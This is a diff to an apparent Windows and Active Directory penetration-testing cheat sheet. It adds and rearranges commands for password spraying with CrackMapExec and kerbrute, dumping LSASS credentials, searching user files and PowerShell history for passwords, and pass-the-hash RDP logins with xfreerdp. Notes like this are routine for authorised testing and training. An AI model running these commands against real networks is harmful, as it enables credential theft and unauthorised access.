@@ -45,6 +45,8 @@
    * `ls -Path C:\Users\* -Recurse -EA Silent | Select-String -Pattern password`
 * LanguageList
    * `Set-WinUserLanguageList -LanguageList en-US`
+* Local Admin
+  * `Get-LocalGroupMember -Group "Administrators"`
 * PowerShell history
    * `ls C:\Users -Force -Recurse -Filter ConsoleHost_history.txt -EA Silent | cat`
 
@@ -136,13 +138,19 @@
       * `net accounts /dom`
    * ActiveDirectory Module
       * `Get-ADDefaultDomainPasswordPolicy`
-   * CrackMapExec
-      * `crackmapexec smb <ip> -d <domain> -u <user> -p <pass> --pass-pol`
+   * See CrackMapExec section
 * Kerbrute
    * `kerbrute passwordspray -d <domain> users.txt <password> [--dc <ip>]`
    * Don't forget to try: `--user-as-pass`
 * PowerShell
    * `Invoke-DomainPasswordSpray -Password <password> -Force -OutFile spray.txt`
+
+
+## CrackMapExec
+* Password Policy
+  * `crackmapexec smb <ip> -d <domain> -u <user> -p <pass> --pass-pol`
+* Password Spray
+  * `crackmapexec [mssql|rdp|smb|winrm] <subnet>> -u <user> -p <pass> --continue-on-success`
 
 
 ## BloodHound
@@ -217,8 +225,6 @@
 * RunDLL
    * `Get-Process lsass`
    * `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <pid> C:\Windows\Tasks\debug.dmp full`
-* CME
-   * `crackmapexec smb <ip_subnet> -u <user> -p <pass> -M lsassy`
 
 
 ## GPPPassword
@@ -586,6 +592,9 @@ Remember that amsi.dll is loaded into a new process to hook any input in the Pow
    * The /admin flag in mstsc.exe allows us to connect to the admin session, which does not disconnect the current user if we perform the login with the same user.
 * Enable PTH
    * `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`
+ * PTH with xfreerdp
+   * `xfreerdp /u:<user> /pth:<hash> /v:<ip> /cert-ignore /dynamic-resolution /timeout:100000 /compression-level:2 /bpp:8`
+   * Optional shared drive: `/drive:home,/home/kali/temp/`
 
 
 ## Lateral - WinRM (port 5985)
